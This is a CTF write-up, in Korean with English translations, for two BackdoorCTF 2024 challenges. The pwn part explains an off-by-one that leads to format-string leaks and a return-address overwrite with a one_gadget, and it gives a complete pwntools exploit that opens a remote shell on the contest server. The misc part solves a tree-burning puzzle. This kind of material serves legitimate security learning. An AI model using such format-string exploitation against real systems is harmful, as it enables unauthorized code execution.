```
pwn 1 solve, misc 1 solve
```

# 목차

1.  pwn / Merry Christmas
    -   보호기법
    -   프로그램 분석
    -   익스플로잇 설계
    -   dec.py
2.  misc / Burn it!
    -   문제 설명
    -   익스플로잇 설계
    -   dec.py

---

# pwn / Merry Chirstmas

## 보호기법

```
csh@csh:/mnt/d/hk/_contest/2024BackdoorCTF/Merry Christmas$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, BuildID[sha1]=0b093ff583da42e2eac9417c897072627959eab5, for GNU/Linux 3.2.0, not stripped

csh@csh:/mnt/d/hk/_contest/2024BackdoorCTF/Merry Christmas$ checksec chall
[*] '/mnt/d/hk/_contest/2024BackdoorCTF/Merry Christmas/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

카나리가 없고, Strip 되어있지 않다. 나머지 보호기법은 걸려 있다.

## 프로그램 분석

`main`에서 `Christmas` 를 실행한다.

```
int Christmas()
{
  char s[8]; // [rsp+8h] [rbp-88h] BYREF
  char v2[64]; // [rsp+10h] [rbp-80h] BYREF
  char format[56]; // [rsp+50h] [rbp-40h] BYREF
  int v4; // [rsp+88h] [rbp-8h]
  unsigned int i; // [rsp+8Ch] [rbp-4h]

  puts("In The Midst of your journey lies a christmas gift to avail!!!");
  strcpy(format, "a regular gift for you,pwnogatchi;goodbye or try again\n");
  strcpy(v2, "April fool!!! I am not giving you flag this easily,bye\n");
  memset(s, 0, sizeof(s));
  puts("do you want gift or flag?? (gift/flag)");
  for ( i = 0; i <= 8; ++i )
  {
    v4 = getchar();
    if ( v4 == 10 )
      break;
    s[i] = v4;
  }
  if ( !strcmp("gift", s) )
    return printf(format);
  else
    return printf(v2);
}
```

`s`는 8바이트만큼 선언되어 있는데, 9바이트를 입력받기 때문에 `off-by-one`이 발생한다. 그리고 스택에 `s` 다음 `v2`가 선언되어 있다. 때마침 `v2`의 두 번째 글자가 p인 탓에, 9번째 바이트를 %로 입력하면 `v2`가 %p...가 되어 `fsb`가 발생한다. 여기서 스택 주소를 얻을 수 있다.

### Eng

`s` is declared as 8 bytes, but since it receives 9 bytes, `off-by-one` occurs. And, `v2` is declared after `s` on the stack. Since the second letter of `v2` is p, if the 9th byte is input as %, `v2` becomes %p... and `fsb` occurs. So we can get the stack address.

```
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  char s[140]; // [rsp+0h] [rbp-90h] BYREF
  int fd; // [rsp+8Ch] [rbp-4h]

  init_proc(argc, argv, envp);
  Christmas();
  puts("press ENTER to continue....");
  getchar();
  fd = open("/dev/null", 1);
  if ( fd < 0 )
  {
    perror("Failed to open /dev/null");
    exit(1);
  }
  printf("Input :");
  fflush(_bss_start);
  if ( dup2(fd, 1) < 0 )
  {
    close(fd);
    exit(1);
  }
  close(fd);
  memset(s, 0, 0x80uLL);
  read(0, s, 0x80uLL);
  printf(s);
  exit(0);
}
```

`printf(s);`에서 `fsb`가 발생한다. 하지만 `main`에서 `stdout`을 닫아버리기 때문에 더 이상 출력은 보지 못한다. 그렇다면 어떤 함수의 RET을 원가젯으로 덮어서 한 번에 끝내야겠다는 생각이 든다.

`printf`는 내부적으로 `__vfprintf_internal`를 호출한다. `printf`의 코드는 libc의 코드 영역에 있기 때문에 `__vfprintf_internal`을 실행할 때 RET에는 libc 관련 주소가 적혀있다. 우리는 스택 주소도 알기 때문에 `fsb`를 이용하여 RET을 원가젯으로 바꾸면 됨을 알 수 있다.

### Eng

In `printf(s);`, `fsb` occurs. However, since `stdout` is closed in `main`, we can no longer see the output. Then, I think I should cover the RET of some function with a one\_gadget and finish it all at once.

`printf` internally calls `__vfprintf_internal`. Since the code of `printf` is in the code area of ​​libc, when `__vfprintf_internal` is executed, RET contains a libc-related address. Since we also know the stack address, we can see that we can replace RET with the one\_gadget using `fsb`.

## 익스플로잇 설계

```
0x7ffff7e165ca <__vfprintf_internal+218>    pop    rbx     RBX => 0x7fffffffc8c8
0x7ffff7e165cb <__vfprintf_internal+219>    pop    r12     R12 => 1
0x7ffff7e165cd <__vfprintf_internal+221>    pop    r13     R13 => 0
0x7ffff7e165cf <__vfprintf_internal+223>    pop    r14     R14 => 0x555555557d60 (__do_global_dtors_aux_fini_array_entry)
0x7ffff7e165d1 <__vfprintf_internal+225>    pop    r15     R15 => 0x7ffff7ffd000 (_rtld_global)
0x7ffff7e165d3 <__vfprintf_internal+227>    pop    rbp     RBP => 0x7fffffffc660
0x7ffff7e165d4 <__vfprintf_internal+228>    ret    <printf+179>
```

`__vfprintf_internal` 마지막에 레지스터 복구를 위해 `pop rbx`, `pop r12`를 한다. 우리는 `fsb`를 쓸 수 있기 때문에 `rbx`와 `r12`를 NULL로 만들 수 있고, 따라서 나는 아래와 같은 원가젯을 사용했다.

### Eng

At the end of `__vfprintf_internal`, it does `pop rbx`, `pop r12` to recover registers. Since we can use `fsb`, we can make `rbx` and `r12` NULL, so I used the following one\_gadget.

```
0xef4ce execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp
```

그리고 원가젯을 RET 주소에 넣는데 `%*25$c`를 사용했다. `%*25$c`란 25번째 인자만큼 출력하겠다는 것이다. 25번째는 `main`의 RET인 `__libc_start_call_main+122` 값이 있는 곳이고, 이는 libc 관련 값이다. 따라서 `%*25$c`를 이용하면 원가젯과의 offset을 따져 fsb payload를 입력하면 브루트포스 없이 쉘을 딸 수 있다.

### Eng

And I used `%*25$c` to insert the one\_gadget into the RET address. `%*25$c` means that we will print only the 25th argument. The 25th is where the value of `__libc_start_call_main+122`, which is the RET of `main`, is, and this is a libc-related value. Therefore, if we use `%*25$c`, we can get a shell without brute force by inputting the fsb payload by calculating the offset between the `__libc_start_call_main+122` value and the one\_gadget.

## dec.py

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

p = remote('34.42.147.172', 4003)
#p = process('./chall')
l = ELF('./libc.so.6')

p.recvuntil(b'(gift/flag)')
p.send(b'%p%p%p%p%')

eip = int(p.recvuntil(b'r')[1:-1], 16) - (0x7fffffffc6b8 - 0x7fffffffc668)
print(hex(eip))

ref = 0x00007ffff7dd51ca - 0x7ffff7dab000
og = 0xef4ce
print(hex(ref))
payload = b'%11$n%12$n%13$n'
payload += b'%*25$c' + b'%' + str(og - ref).encode() + b'c' + b'%14$n'
payload += b'a' * 6
print(hex(len(payload)))
payload += p64(eip - 0x2c) + p64(eip - 0x30) + p64(eip - 0x28) + p64(eip)
p.sendafter(b"press ENTER to continue....", b'\n')

#gdb.attach(p)

p.recvuntil(b'Input :')
p.send(payload)
p.interactive()
```

---

# misc / Burn it!

## 문제 설명

```
Hey Ghost Hunter. You have come across a few cursed objects that have spirits attached to them.

These cursed objects are made up of knots that are connected by threads. The threads are connected in such a way that no cycles are formed. We need to burn these cursed objects to get rid of the spirits, but there is a catch. If while burning, the cursed object breaks into two, the spirit will be released and you will suffer a very bad death.

You can set fire to multiple knots at chosen points of time (time can't be negative) and the cursed object will start burning from those points at those particular times (two knots can start burning at the same time). Each thread takes 1 second to burn , so the fire can reach from one knot to an adjacent one in 1 second. Tell me which knots to burn at what time and if you burn all cursed objects you get the flag.
```

트리 구조가 주어지고, 노드들이 언제 탈지 정할 수 있다. 타고 있는 노드와 연결되어 있는 노드는 1초 뒤에 탄다고 한다. 트리가 분리되면 실패한다.

## 익스플로잇 설계

트리 구조이기 때문에 어느 노드를 루트로 해도 트리 구조가 유지된다. 필자는 1번 노드를 기준으로 하였다. 그리고 리프 노드만 태우면 된다는 관찰을 하였다. 리프 노드가 아닌 노드는 어짜피 리프 노드가 타면서 제거될 것이다.  
루트 노드를 기준으로 깊이가 같은 것끼리 같은 줄에 있는 트리를 상상해보자. 같은 줄에 있는 노드가 같은 시간에 탄다면 트리가 두 개로 쪼개질 일이 없을 것이다. 따라서 리프 노드가 `max-depth` - `node's depth` 시간에 타게 설정하면 가장 밑에 있는 줄부터 타면서 올라오게 된다. 트리가 한 줄 한 줄 사라지는 것이고, 문제 설정에 맞는 익스이다.

## dec.py

```python
from pwn import *
from collections import defaultdict

def find_leaf_depths(N, edges, root):
    graph = defaultdict(list)
    for u, v in edges:
        graph[u].append(v)
        graph[v].append(u)

    depths = {}
    visited = set()

    def dfs(node, depth):
        visited.add(node)
        depths[node] = depth

        is_leaf = True
        for neighbor in graph[node]:
            if neighbor not in visited:
                is_leaf = False
                dfs(neighbor, depth + 1)

        if is_leaf:
            return node, depth
        return None

    dfs(root, 0)

    leaf_depths = {}
    for node in range(1, N + 1):
        if node in depths:
            if len(graph[node]) == 1 and node != root:
                leaf_depths[node] = depths[node]

    return leaf_depths

p = remote('34.42.147.172', 8010)

t = int(p.recvline().decode().split(':')[1].strip())

for _ in range(t):
    edges = list()
    p.recvuntil(b': ')
    N = int(p.recvline()[:-1])
    p.recvline()
    for _ in range(N - 1):
        l = p.recvline()[:-1].decode()
        u, v = map(int, l.split())
        edges.append((u, v))

    result = find_leaf_depths(N, edges, 1)
    max_depth = max(result.values())

    payload = str(len(result)).encode()

    for node, depth in sorted(result.items()):
        payload += b' ' + str(node).encode()
        payload += b' ' + str(max_depth - depth).encode()

    p.sendlineafter(b': ', payload)
    print()

p.interactive()
```